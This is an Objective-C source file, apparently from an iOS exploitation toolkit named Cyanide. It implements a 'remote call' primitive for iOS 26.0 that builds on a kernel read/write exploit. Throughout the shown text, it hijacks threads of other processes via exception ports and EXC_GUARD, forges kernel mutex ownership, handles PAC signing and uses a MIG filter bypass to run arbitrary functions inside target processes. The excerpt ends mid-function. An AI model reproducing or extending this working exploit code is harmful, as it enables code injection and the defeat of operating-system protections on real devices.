//
//  remote_call.m
//  Cyanide
//
//  Created by seo on 3/29/26.
//

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <pthread.h>
#import <signal.h>
#import <stddef.h>
#import <stdint.h>
#import <stdlib.h>
#import <string.h>

#import "RemoteCall.h"
#import "CNDLabRemoteCallClient.h"
#import "VM.h"
#import "Exception.h"
#import "PAC.h"
#import "Thread.h"
#import "MigFilterBypassThread.h"
#import "../kexploit/kexploit_opa334.h"
#import "../kexploit/krw.h"
#import "../kexploit/offsets.h"
#import "../kexploit/kutils.h"
#import "../kexploit/xpaci.h"
#import "../utils/process.h"

extern bool gIsPACSupported;
extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, mach_vm_size_t size);

// xnu-10002.81.5/osfmk/kern/exc_guard.h
#define EXC_GUARD_ENCODE_TYPE(code, type) \
    ((code) |= (((uint64_t)(type) & 0x7ull) << 61))
#define EXC_GUARD_ENCODE_FLAVOR(code, flavor) \
    ((code) |= (((uint64_t)(flavor) & 0x1fffffffull) << 32))
#define EXC_GUARD_ENCODE_TARGET(code, target) \
    ((code) |= (((uint64_t)(target) & 0xffffffffull)))


// xnu-10002.81.5/osfmk/mach/arm/_structs.h
#define __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK 0xff000000
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR 0x2
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC 0x4
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR 0x8

// from pe_main.js
#define SHMEM_CACHE_SIZE                256
#define FAKE_PC_TROJAN_CREATOR          0x101
#define FAKE_LR_TROJAN_CREATOR          0x201
#define FAKE_PC_TROJAN                  0x301
#define FAKE_LR_TROJAN                  0x401
#define CND_RC_IDENTITY_MESSAGE_ID      2407
#define CND_RC_SEND_RIGHT_MESSAGE_ID    2408
/* 23A341 arm64e shared-cache addresses: _getpid=0x22b0d8138 and a
 * deterministic `brk #1` instruction=0x22b0d6440.  The relative offset is
 * slide-independent and is validated against the local mapping before use. */
#define CND_RC_GETPID_TO_BRK1_DELTA     (-0x1cf8LL)
#define CND_RC_BRK1_INSTRUCTION         0xd4200020U

typedef struct {
    mach_msg_header_t Head;
    mach_msg_body_t msgh_body;
    mach_msg_port_descriptor_t thread;
    mach_msg_port_descriptor_t task;
    NDR_record_t NDR;
    exception_type_t exception;
    mach_msg_type_number_t codeCnt;
    int64_t code[2];
    int flavor;
    mach_msg_type_number_t old_stateCnt;
    natural_t old_state[1296];
} __attribute__((packed, aligned(4))) CNDRemoteCallIdentityRequest;

typedef struct {
    mach_msg_header_t Head;
    NDR_record_t NDR;
    kern_return_t RetCode;
    int flavor;
    mach_msg_type_number_t new_stateCnt;
    natural_t new_state[1296];
} __attribute__((packed, aligned(4))) CNDRemoteCallIdentityReply;

typedef struct {
    mach_msg_header_t head;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t right;
} CNDRemoteCallSendRightMessage;

// from https://github.com/nickingravallo/Machium/blob/main/Machium/Breakpoint.h
#define BREAKPOINT_ENABLE 481
#define BREAKPOINT_DISABLE 0

uint64_t g_RC_targetProcOverride = 0;
uint64_t g_RC_gadgetPacia = 0;

static pthread_mutex_t g_universal_ipc_mutex;
static pthread_once_t g_universal_ipc_mutex_once = PTHREAD_ONCE_INIT;

static void init_universal_mutex(void)
{
    pthread_mutexattr_t attr;
    pthread_mutexattr_init(&attr);
    pthread_mutexattr_settype(&attr, PTHREAD_MUTEX_RECURSIVE);
    pthread_mutex_init(&g_universal_ipc_mutex, &attr);
    pthread_mutexattr_destroy(&attr);
}

static uint64_t do_remote_call_temp_internal(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);
static uint64_t do_remote_call_stable_internal(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);
static uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);
static bool remote_read_internal(uint64_t src, void *dst, uint64_t size);
static bool remote_write_internal(uint64_t dst, const void *src, uint64_t size);
static int destroy_remote_call_internal(void);
static void abandon_remote_call_internal(void);
static bool remote_call_drain_in_flight_synthetic_call_internal(int timeoutMS);

static __thread RemoteCallInitFailure g_RC_lastInitFailure = RemoteCallInitFailureNone;
static __thread uint32_t g_RC_lastInitFailurePid = 0;

typedef struct RemoteCallState {
    CNDLabRemoteCallClient labClient;
    uint64_t taskAddr;
    uint64_t procAddr;
    bool creatingExtraThread;
    mach_port_t firstExceptionPort;
    mach_port_t secondExceptionPort;
    uint64_t firstExceptionPortAddr;
    uint64_t secondExceptionPortAddr;
    pthread_t dummyThread;
    mach_port_t dummyThreadMach;
    uint64_t dummyThreadAddr;
    uint64_t dummyThreadTro;
    uint64_t selfThreadAddr;
    uint32_t selfThreadCtid;
    arm_thread_state64_internal originalState;
    arm_thread_state64_internal capturedOriginalStates[5];
    size_t capturedOriginalStateCount;
    arm_thread_state64_internal callThreadResumeState;
    bool callThreadResumeStateValid;
    bool callThreadNaturalReturn;
    bool syntheticCallInFlight;
    bool deferredTeardownScheduled;
    uint64_t vmMap;
    uint64_t callThreadAddr;
    uint64_t trojanThreadAddr;
    int pid;
    bool success;
    NSMutableArray<NSNumber *> *threadList;
    uint64_t trojanMem;
    struct VMShmem shmemCache[SHMEM_CACHE_SIZE];
    uint64_t shmemUseCounter[SHMEM_CACHE_SIZE];
    uint64_t shmemClock;
    uint64_t shmemEvictions;
    int firstExceptionTimeoutMS;
    int stableExceptionTimeoutFloorMS;
    bool originalThreadOnly;
    bool identityBootstrapRequested;
    bool identityMessageValid;
    bool identityThreadRightExact;
    bool identityTaskRightExact;
    bool identityHandlerDowngraded;
    bool identityHandlerRetained;
    bool identityInitialConversionSucceeded;
    bool identityInitialReplySucceeded;
    mach_port_t identityThreadPort;
    mach_port_t identityTaskPort;
    uint64_t identityThreadAddr;
    uint64_t identityTrapAddress;
    uint64_t identityConversionCount;
    uint64_t identityConversionFailures;
    bool identityConverterUnavailable;
    uint64_t identityPACFallbackCount;
    uint64_t identityPACFallbackFailures;
    uint64_t stableCalls;
    uint64_t stableFailures;
    uint64_t ioFailures;
    char lastStableCall[64];
    char lastStableFailure[64];
    char lastStableFailureReason[96];
} RemoteCallState;

static RemoteCallState g_RC_defaultState = {
    .labClient = { .socketFD = -1 },
    .success = true,
    .stableExceptionTimeoutFloorMS = 10000,
};
static uint64_t g_RC_stableCallsTotal;
static __thread RemoteCallState *g_RC_currentState;

@interface RemoteCallSession ()
- (RemoteCallState *)remoteCallStatePointer;
@end

static RemoteCallState *remote_call_current_state(void)
{
    if (!g_RC_currentState)
        g_RC_currentState = &g_RC_defaultState;
    return g_RC_currentState;
}

static RemoteCallState *remote_call_push_state(RemoteCallState *state)
{
    RemoteCallState *previous = remote_call_current_state();
    g_RC_currentState = state ?: &g_RC_defaultState;
    return previous;
}

static void remote_call_pop_state(RemoteCallState *previous)
{
    g_RC_currentState = previous ?: &g_RC_defaultState;
}

#define g_RC_taskAddr              (remote_call_current_state()->taskAddr)
#define g_RC_labClient             (remote_call_current_state()->labClient)
#define g_RC_procAddr              (remote_call_current_state()->procAddr)
#define g_RC_creatingExtraThread   (remote_call_current_state()->creatingExtraThread)
#define g_RC_firstExceptionPort    (remote_call_current_state()->firstExceptionPort)
#define g_RC_secondExceptionPort   (remote_call_current_state()->secondExceptionPort)
#define g_RC_firstExceptionPortAddr  (remote_call_current_state()->firstExceptionPortAddr)
#define g_RC_secondExceptionPortAddr (remote_call_current_state()->secondExceptionPortAddr)
#define g_RC_dummyThread           (remote_call_current_state()->dummyThread)
#define g_RC_dummyThreadMach       (remote_call_current_state()->dummyThreadMach)
#define g_RC_dummyThreadAddr       (remote_call_current_state()->dummyThreadAddr)
#define g_RC_dummyThreadTro        (remote_call_current_state()->dummyThreadTro)
#define g_RC_selfThreadAddr        (remote_call_current_state()->selfThreadAddr)
#define g_RC_selfThreadCtid        (remote_call_current_state()->selfThreadCtid)

/* xnu-12377 (iOS 26.0 23A341) osfmk/kern/lock_mtx.h: the 32-bit lck_mtx.data
 * word stores the owner ctid in the low 28 bits and LCK_MTX_NEEDS_WAKEUP in
 * bit 30.  There is no separate LOCKED bit: owner == 0 means free, and every
 * acquire path requires owner == 0.  lck_mtx_unlock's slow path panics
 * ("Mutex ... is unexpectedly not owned by thread ...", lock_mtx.c) when the
 * unlocking thread's ctid does not match the stored owner. */
#define CND_LCK_MTX_CTID_MASK      0x0fffffffU
#define CND_LCK_MTX_NEEDS_WAKEUP   0x40000000U
#define g_RC_originalState         (remote_call_current_state()->originalState)
#define g_RC_capturedOriginalStates (remote_call_current_state()->capturedOriginalStates)
#define g_RC_capturedOriginalStateCount (remote_call_current_state()->capturedOriginalStateCount)
#define g_RC_callThreadResumeState (remote_call_current_state()->callThreadResumeState)
#define g_RC_callThreadResumeStateValid (remote_call_current_state()->callThreadResumeStateValid)
#define g_RC_callThreadNaturalReturn (remote_call_current_state()->callThreadNaturalReturn)
#define g_RC_syntheticCallInFlight (remote_call_current_state()->syntheticCallInFlight)
#define g_RC_deferredTeardownScheduled (remote_call_current_state()->deferredTeardownScheduled)
#define g_RC_vmMap                 (remote_call_current_state()->vmMap)
#define g_RC_callThreadAddr        (remote_call_current_state()->callThreadAddr)
#define g_RC_trojanThreadAddr      (remote_call_current_state()->trojanThreadAddr)
#define g_RC_pid                   (remote_call_current_state()->pid)
#define g_RC_success               (remote_call_current_state()->success)
#define g_RC_threadList            (remote_call_current_state()->threadList)
#define g_RC_trojanMem             (remote_call_current_state()->trojanMem)
#define g_RC_shmemCache            (remote_call_current_state()->shmemCache)
#define g_RC_shmemUseCounter       (remote_call_current_state()->shmemUseCounter)
#define g_RC_shmemClock            (remote_call_current_state()->shmemClock)
#define g_RC_shmemEvictions        (remote_call_current_state()->shmemEvictions)
#define g_RC_firstExceptionTimeoutMS (remote_call_current_state()->firstExceptionTimeoutMS)
#define g_RC_stableExceptionTimeoutFloorMS (remote_call_current_state()->stableExceptionTimeoutFloorMS)
#define g_RC_originalThreadOnly      (remote_call_current_state()->originalThreadOnly)
#define g_RC_identityBootstrapRequested (remote_call_current_state()->identityBootstrapRequested)
#define g_RC_identityMessageValid   (remote_call_current_state()->identityMessageValid)
#define g_RC_identityThreadRightExact (remote_call_current_state()->identityThreadRightExact)
#define g_RC_identityTaskRightExact (remote_call_current_state()->identityTaskRightExact)
#define g_RC_identityHandlerDowngraded (remote_call_current_state()->identityHandlerDowngraded)
#define g_RC_identityHandlerRetained (remote_call_current_state()->identityHandlerRetained)
#define g_RC_identityInitialConversionSucceeded (remote_call_current_state()->identityInitialConversionSucceeded)
#define g_RC_identityInitialReplySucceeded (remote_call_current_state()->identityInitialReplySucceeded)
#define g_RC_identityThreadPort     (remote_call_current_state()->identityThreadPort)
#define g_RC_identityTaskPort       (remote_call_current_state()->identityTaskPort)
#define g_RC_identityThreadAddr     (remote_call_current_state()->identityThreadAddr)
#define g_RC_identityTrapAddress   (remote_call_current_state()->identityTrapAddress)
#define g_RC_identityConversionCount (remote_call_current_state()->identityConversionCount)
#define g_RC_identityConversionFailures (remote_call_current_state()->identityConversionFailures)
#define g_RC_identityConverterUnavailable (remote_call_current_state()->identityConverterUnavailable)
#define g_RC_identityPACFallbackCount (remote_call_current_state()->identityPACFallbackCount)
#define g_RC_identityPACFallbackFailures (remote_call_current_state()->identityPACFallbackFailures)
#define g_RC_stableCalls             (remote_call_current_state()->stableCalls)
#define g_RC_stableFailures          (remote_call_current_state()->stableFailures)
#define g_RC_ioFailures              (remote_call_current_state()->ioFailures)
#define g_RC_lastStableCall          (remote_call_current_state()->lastStableCall)
#define g_RC_lastStableFailure       (remote_call_current_state()->lastStableFailure)
#define g_RC_lastStableFailureReason (remote_call_current_state()->lastStableFailureReason)

static void remote_call_note_init_failure(RemoteCallInitFailure failure, uint32_t pid)
{
    g_RC_lastInitFailure = failure;
    g_RC_lastInitFailurePid = pid;
}

RemoteCallInitFailure remote_call_last_init_failure(void)
{
    return g_RC_lastInitFailure;
}

uint32_t remote_call_last_init_failure_pid(void)
{
    return g_RC_lastInitFailurePid;
}

const char *remote_call_init_failure_description(RemoteCallInitFailure failure)
{
    switch (failure) {
        case RemoteCallInitFailureNone: return "none";
        case RemoteCallInitFailureKRWUnavailable: return "KRW unavailable";
        case RemoteCallInitFailureProcessMissing: return "process not found";
        case RemoteCallInitFailureInvalidTask: return "invalid task";
        case RemoteCallInitFailureExceptionPort: return "exception port setup failed";
        case RemoteCallInitFailureTaskGuard: return "task EXC_GUARD setup failed";
        case RemoteCallInitFailureLocalThread: return "local bootstrap thread setup failed";
        case RemoteCallInitFailureNoTargetThreads: return "no injectable target threads";
        case RemoteCallInitFailureFirstExceptionTimeout: return "target did not deliver bootstrap exception";
        case RemoteCallInitFailureOther: return "other RemoteCall init failure";
    }
    return "unknown RemoteCall init failure";
}

static void remote_call_copy_cstring(char *dst, size_t dstSize, const char *src)
{
    if (!dst || dstSize == 0) return;
    const char *value = (src && src[0]) ? src : "-";
    snprintf(dst, dstSize, "%s", value);
}

static void remote_call_note_stable_call(const char *name)
{
    g_RC_stableCalls++;
    g_RC_stableCallsTotal++;
    remote_call_copy_cstring(g_RC_lastStableCall,
                             sizeof(remote_call_current_state()->lastStableCall),
                             name);
}

static void remote_call_note_stable_failure(const char *name, const char *reason)
{
    g_RC_stableFailures++;
    remote_call_copy_cstring(g_RC_lastStableFailure,
                             sizeof(remote_call_current_state()->lastStableFailure),
                             name);
    remote_call_copy_cstring(g_RC_lastStableFailureReason,
                             sizeof(remote_call_current_state()->lastStableFailureReason),
                             reason);
}

static bool remote_call_verbose_logging(void)
{
    const char *env = getenv("RC_VERBOSE");
    return env && env[0] && strcmp(env, "0") != 0;
}

static __thread bool g_RC_suppressResultLogs;

#define RC_DEBUG(...) do { if (remote_call_verbose_logging()) printf(__VA_ARGS__); } while (0)

static bool remote_call_should_log_result(const char *name, bool stable)
{
    if (remote_call_verbose_logging())
        return true;

    if (g_RC_suppressResultLogs)
        return false;

    if (!name)
        return true;

    /* Selector-aware objc_msgSend labels are retained for failure reports,
     * but successful setup traffic should remain as quiet as the generic
     * objc_msgSend entry point. */
    if (strncmp(name, "objc_msgSend:", 13) == 0)
        return false;

    static const char *quietSymbols[] = {
        "malloc",
        "free",
        "objc_msgSend",
        "objc_msgSendSuper",
        "objc_msgSendSuper2",
        "sel_registerName",
        "sel_getUid",
        "objc_getClass",
        "objc_lookUpClass",
        "objc_allocateClassPair",
        "object_getClass",
        "object_getClassName",
        "class_getName",
        "class_getSuperclass",
        "class_getInstanceMethod",
        "class_getClassMethod",
        "class_getInstanceVariable",
        "class_getInstanceSize",
        "class_respondsToSelector",
        "method_getTypeEncoding",
        "method_getName",
        "method_getImplementation",
        "ivar_getOffset",
        "ivar_getName",
        "ivar_getTypeEncoding",
        "strdup",
        "strcmp",
        "strlen",
        "strnlen",
        "memcpy",
        "memcmp",
        "CFStringCreateWithCString",
        "CFStringCreateWithCStringNoCopy",
        "CFStringGetCStringPtr",
        "CFStringGetLength",
        "CFNumberGetValue",
        "CFRelease",
        "CFRetain",
        "dlopen",
        "dlsym",
        "dladdr",
        "IOServiceMatching",
        "IOServiceGetMatchingService",
        "IORegistryEntryCreateCFProperty",
        "IOObjectRelease",
        "memset",
        "getpid",
        "pthread_create_suspended_np",
        "pthread_mach_thread_np",
        "thread_resume",
        "mmap",
        "sandbox_extension_issue_file",
        "sandbox_extension_issue_file_to_process",
        "sandbox_extension_consume",
    };

    for (size_t i = 0; i < sizeof(quietSymbols) / sizeof(quietSymbols[0]); i++) {
        if (strcmp(name, quietSymbols[i]) == 0)
            return false;
    }

    // Log-once symbols: emit the first invocation so it's visible in the log,
    // then go silent so per-window / per-iteration loops don't flood. CAS
    // means concurrent first-callers never both win.
    static struct { const char *name; volatile int logged; } logOnceTable[] = {
        { "objc_setAssociatedObject", 0 },
        { "objc_getAssociatedObject", 0 },
    };
    for (size_t i = 0; i < sizeof(logOnceTable) / sizeof(logOnceTable[0]); i++) {
        if (strcmp(name, logOnceTable[i].name) == 0) {
            return __sync_bool_compare_and_swap(&logOnceTable[i].logged, 0, 1);
        }
    }

    if (!stable)
        return true;

    return true;
}

static void release_shmem_slot(int i)
{
    if (i < 0 || i >= SHMEM_CACHE_SIZE) return;
    if (g_RC_shmemCache[i].localAddress) {
        mach_vm_deallocate(mach_task_self_,
                           (mach_vm_address_t)g_RC_shmemCache[i].localAddress,
                           PAGE_SIZE);
    }
    if (g_RC_shmemCache[i].port) {
        mach_port_deallocate(mach_task_self_, (mach_port_name_t)g_RC_shmemCache[i].port);
    }
    memset(&g_RC_shmemCache[i], 0, sizeof(g_RC_shmemCache[i]));
    g_RC_shmemUseCounter[i] = 0;
}

static void clear_remote_shmem_cache(void)
{
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (g_RC_shmemCache[i].used) release_shmem_slot(i);
    }
    g_RC_shmemClock = 0;
    g_RC_shmemEvictions = 0;
}

static uint32_t reap_dead_port_names(const char *reason)
{
    mach_port_name_array_t names = NULL;
    mach_port_type_array_t types = NULL;
    mach_msg_type_number_t namesCount = 0;
    mach_msg_type_number_t typesCount = 0;
    kern_return_t kr = mach_port_names(mach_task_self_, &names, &namesCount, &types, &typesCount);
    if (kr != KERN_SUCCESS) return 0;

    mach_msg_type_number_t limit = namesCount < typesCount ? namesCount : typesCount;
    uint32_t dead = 0;
    for (mach_msg_type_number_t i = 0; i < limit; i++) {
        if ((types[i] & MACH_PORT_TYPE_DEAD_NAME) == 0) continue;
        if (mach_port_deallocate(mach_task_self_, names[i]) == KERN_SUCCESS) {
            dead++;
        }
    }

    if (dead && remote_call_verbose_logging()) {
        static volatile uint64_t reapTotal = 0;
        static volatile uint64_t reapEvents = 0;
        uint64_t total = __sync_add_and_fetch(&reapTotal, dead);
        uint64_t events = __sync_add_and_fetch(&reapEvents, 1);
        printf("[RemoteCall] reaped %u ports current=%u cumulative=%llu events=%llu\n",
               dead, namesCount, (unsigned long long)total, (unsigned long long)events);
    }

    if (names) {
        vm_deallocate(mach_task_self_,
                      (vm_address_t)names,
                      (vm_size_t)namesCount * sizeof(mach_port_name_t));
    }
    if (types) {
        vm_deallocate(mach_task_self_,
                      (vm_address_t)types,
                      (vm_size_t)typesCount * sizeof(mach_port_type_t));
    }
    return dead;
}

static void reap_dead_port_names_if_needed(const char *reason)
{
    static volatile uint32_t signCount = 0;
    uint32_t count = __sync_add_and_fetch(&signCount, 1);
    if ((count & 0x3f) != 0) return;
    (void)reap_dead_port_names(reason);
}

static exception_mask_t remote_call_exception_mask(void)
{
    return EXC_MASK_GUARD |
           EXC_MASK_BAD_ACCESS |
           EXC_MASK_BAD_INSTRUCTION |
           EXC_MASK_BREAKPOINT |
           EXC_MASK_ARITHMETIC;
}

static kern_return_t remote_call_receive_identity(
    mach_port_t receivePort, CNDRemoteCallIdentityRequest *request,
    int timeoutMS)
{
    if (!request || !MACH_PORT_VALID(receivePort) || timeoutMS <= 0) {
        return KERN_INVALID_ARGUMENT;
    }
    union {
        CNDRemoteCallIdentityRequest request;
        uint8_t bytes[sizeof(CNDRemoteCallIdentityRequest) +
            sizeof(mach_msg_max_trailer_t)];
    } receive = {0};
    kern_return_t kr = mach_msg(&receive.request.Head,
        MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(receive), receivePort,
        timeoutMS, MACH_PORT_NULL);
    if (kr == KERN_SUCCESS) *request = receive.request;
    return kr;
}

static bool remote_call_identity_request_is_valid(
    const CNDRemoteCallIdentityRequest *request)
{
    size_t requiredSize = offsetof(CNDRemoteCallIdentityRequest, old_state) +
        sizeof(arm_thread_state64_internal);
    return request &&
        request->Head.msgh_id == CND_RC_IDENTITY_MESSAGE_ID &&
        request->Head.msgh_size >= requiredSize &&
        (request->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) != 0 &&
        request->msgh_body.msgh_descriptor_count == 2 &&
        request->thread.type == MACH_MSG_PORT_DESCRIPTOR &&
        request->task.type == MACH_MSG_PORT_DESCRIPTOR &&
        MACH_PORT_VALID(request->thread.name) &&
        MACH_PORT_VALID(request->task.name) &&
        request->flavor == ARM_THREAD_STATE64 &&
        request->old_stateCnt == ARM_THREAD_STATE64_COUNT;
}

static kern_return_t remote_call_reply_identity(
    const CNDRemoteCallIdentityRequest *request,
    const arm_thread_state64_internal *state)
{
    if (!request || !state ||
        !MACH_PORT_VALID(request->Head.msgh_remote_port)) {
        return KERN_INVALID_ARGUMENT;
    }
    CNDRemoteCallIdentityReply reply = {0};
    reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0);
    reply.Head.msgh_remote_port = request->Head.msgh_remote_port;
    reply.Head.msgh_id = request->Head.msgh_id + 100;
    reply.NDR = request->NDR;
    reply.RetCode = KERN_SUCCESS;
    reply.flavor = ARM_THREAD_STATE64;
    reply.new_stateCnt = ARM_THREAD_STATE64_COUNT;
    memcpy(reply.new_state, state, sizeof(*state));
    reply.Head.msgh_size = (mach_msg_size_t)(
        offsetof(CNDRemoteCallIdentityReply, new_state) + sizeof(*state));
    return mach_msg(&reply.Head, MACH_SEND_MSG, reply.Head.msgh_size, 0,
        MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
}

static void remote_call_release_identity_rights(void)
{
    if (MACH_PORT_VALID(g_RC_identityThreadPort)) {
        mach_port_deallocate(mach_task_self_, g_RC_identityThreadPort);
    }
    g_RC_identityThreadPort = MACH_PORT_NULL;
    if (MACH_PORT_VALID(g_RC_identityTaskPort)) {
        mach_port_deallocate(mach_task_self_, g_RC_identityTaskPort);
    }
    g_RC_identityTaskPort = MACH_PORT_NULL;
}

static void remote_call_release_identity_request_rights(
    CNDRemoteCallIdentityRequest *request, bool retainThread)
{
    if (!request) return;
    if (MACH_PORT_VALID(request->task.name)) {
        mach_port_deallocate(mach_task_self_, request->task.name);
        request->task.name = MACH_PORT_NULL;
    }
    if (!retainThread && MACH_PORT_VALID(request->thread.name)) {
        mach_port_deallocate(mach_task_self_, request->thread.name);
        request->thread.name = MACH_PORT_NULL;
    }
}

typedef struct {
    ExceptionMessage exception;
    CNDRemoteCallIdentityRequest identityRequest;
    bool usesIdentity;
} CNDRemoteCallOriginalThreadException;

static bool remote_call_wait_original_thread_exception(
    mach_port_t exceptionPort,
    CNDRemoteCallOriginalThreadException *event,
    int timeoutMS)
{
    if (!event) return false;
    memset(event, 0, sizeof(*event));

    if (!g_RC_identityHandlerRetained) {
        return wait_exception(exceptionPort, &event->exception,
                              timeoutMS, false);
    }

    kern_return_t receiveKR = remote_call_receive_identity(
        exceptionPort, &event->identityRequest, timeoutMS);
    if (receiveKR != KERN_SUCCESS ||
        !remote_call_identity_request_is_valid(&event->identityRequest)) {
        printf("[RemoteCall] subsequent identity exception invalid "
               "kr=0x%x id=%d size=%u descriptors=%u flavor=%d count=%u\n",
               receiveKR, event->identityRequest.Head.msgh_id,
               event->identityRequest.Head.msgh_size,
               event->identityRequest.msgh_body.msgh_descriptor_count,
               event->identityRequest.flavor,
               event->identityRequest.old_stateCnt);
        remote_call_release_identity_request_rights(
            &event->identityRequest, false);
        return false;
    }

    /* task_get_ipc_port_kobject() takes a kernel task address, not the
     * mach_task_self_ port name.  The first identity message is resolved with
     * task_self() during bootstrap; use the same kernel task here for every
     * duplicate identity right delivered by later exceptions. */
    uint64_t selfTask = task_self();
    uint64_t deliveredThread = task_get_ipc_port_kobject(
        selfTask, event->identityRequest.thread.name);
    uint64_t deliveredTask = task_get_ipc_port_kobject(
        selfTask, event->identityRequest.task.name);
    if (deliveredThread != g_RC_identityThreadAddr ||
        deliveredTask != g_RC_taskAddr) {
        printf("[RemoteCall] subsequent identity right mismatch "
               "thread=%#llx expected=%#llx task=%#llx expected=%#llx\n",
               deliveredThread, g_RC_identityThreadAddr,
               deliveredTask, g_RC_taskAddr);
        (void)remote_call_reply_identity(&event->identityRequest,
            (const arm_thread_state64_internal *)
                event->identityRequest.old_state);
        remote_call_release_identity_request_rights(
            &event->identityRequest, false);
        return false;
    }

    event->usesIdentity = true;
    memcpy(&event->exception.threadState,
           event->identityRequest.old_state,
           sizeof(event->exception.threadState));
    event->exception.exception =
        (uint32_t)event->identityRequest.exception;
    event->exception.codeCnt = event->identityRequest.codeCnt;
    if (event->identityRequest.codeCnt > 0) {
        event->exception.codeFirst =
            (uint64_t)event->identityRequest.code[0];
    }
    if (event->identityRequest.codeCnt > 1) {
        event->exception.codeSecond =
            (uint64_t)event->identityRequest.code[1];
    }
    return true;
}

static bool remote_call_reply_original_thread_exception(
    CNDRemoteCallOriginalThreadException *event,
    const arm_thread_state64_internal *state)
{
    if (!event || !state) return false;
    if (!event->usesIdentity) {
        return reply_with_state(&event->exception,
                                (arm_thread_state64_internal *)state);
    }

    kern_return_t replyKR = remote_call_reply_identity(
        &event->identityRequest, state);
    remote_call_release_identity_request_rights(
        &event->identityRequest, false);
    event->usesIdentity = false;
    return replyKR == KERN_SUCCESS;
}

static uint64_t remote_call_resolve_identity_trap_address(void)
{
    uint64_t getpidAddress = native_strip(
        (uint64_t)(uintptr_t)dlsym(RTLD_DEFAULT, "getpid"));
    if (!getpidAddress) return 0;

    uint64_t trapAddress = (uint64_t)(
        (int64_t)getpidAddress + CND_RC_GETPID_TO_BRK1_DELTA);
    uint32_t instruction = 0;
    memcpy(&instruction, (const void *)(uintptr_t)trapAddress,
           sizeof(instruction));
    if (instruction != CND_RC_BRK1_INSTRUCTION) {
        printf("[RemoteCall] 23A341 shared-cache trap validation failed "
               "getpid=%#llx trap=%#llx instruction=%#x\n",
               getpidAddress, trapAddress, instruction);
        return 0;
    }
    return trapAddress;
}

/* Release the forged dummy-thread mutex owner, but only while the word
 * still names us.  Every lck_mtx acquire path requires owner == 0, so while
 * the stored owner is still our ctid the helper cannot have taken the lock
 * and this write cannot land inside its critical section.  If the helper
 * already owns the mutex, its own lck_mtx_unlock restores owner == 0 with
 * proper wakeup handling; clobbering the word there would make that unlock
 * see owner 0 and panic at lock_mtx.c ("unexpectedly not owned by thread"). */
static void release_forged_dummy_mutex(const char *why)
{
    uint32_t mtx = thread_get_mutex(g_RC_dummyThreadAddr);
    if ((mtx & CND_LCK_MTX_CTID_MASK) == g_RC_selfThreadCtid) {
        thread_set_mutex(g_RC_dummyThreadAddr, CND_LCK_MTX_NEEDS_WAKEUP);
    } else {
        RC_DEBUG("[%s] dummy mutex %#x no longer forged to ctid %#x; "
                 "skipping release\n", why, mtx, g_RC_selfThreadCtid);
    }
}

bool set_exception_port_on_thread(mach_port_t exceptionPort,
                                  uint64_t currThread,
                                  bool useMigFilterBypass,
                                  exception_behavior_t behavior) {
    bool success = false;
    
    void* thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
    void* pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
    if (!thread_set_exception_ports_addr || !pthread_exit_addr) {
        printf("[%s:%d] missing thread_set_exception_ports/pthread_exit symbols\n",
               __FUNCTION__, __LINE__);
        return false;
    }
    if (!is_kaddr_valid(currThread)) {
        printf("[%s:%d] invalid target thread %#llx\n",
               __FUNCTION__, __LINE__, currThread);
        return false;
    }
    if (thread_get_task(currThread) != g_RC_taskAddr) {
        printf("[%s:%d] target thread %#llx left task %#llx before setup\n",
               __FUNCTION__, __LINE__, currThread, g_RC_taskAddr);
        return false;
    }
    if (!g_RC_dummyThreadMach || !is_kaddr_valid(g_RC_dummyThreadAddr)) {
        printf("[%s:%d] dummy thread unavailable mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, g_RC_dummyThreadMach, g_RC_dummyThreadAddr);
        return false;
    }
    
    pthread_t pthread = NULL;
    int createErr = pthread_create_suspended_np(&pthread, NULL,
        (void *(*)(void *))thread_set_exception_ports_addr, NULL);
    if (createErr != 0 || !pthread) {
        printf("[%s:%d] pthread_create_suspended_np failed err=%d thread=%p\n",
               __FUNCTION__, __LINE__, createErr, pthread);
        return false;
    }
    
    mach_port_t machThread = pthread_mach_thread_np(pthread);
    if (!machThread) {
        printf("[%s:%d] pthread_mach_thread_np returned null for helper thread\n",
               __FUNCTION__, __LINE__);
        pthread_cancel(pthread);
        return false;
    }
    uint64_t machThreadAddr = task_get_ipc_port_kobject(task_self(), machThread);
    if (!is_kaddr_valid(machThreadAddr)) {
        printf("[%s:%d] failed to resolve helper thread kobject mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, machThread, machThreadAddr);
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }

    if(useMigFilterBypass) {
        mig_bypass_monitor_threads(g_RC_selfThreadAddr, machThreadAddr);
    }

    arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    kern_return_t kr = thread_get_state(machThread, ARM_THREAD_STATE64,
                                        (thread_state_t)&state, &count);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_get_state failed: 0x%x (%s)\n",
               __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }
    
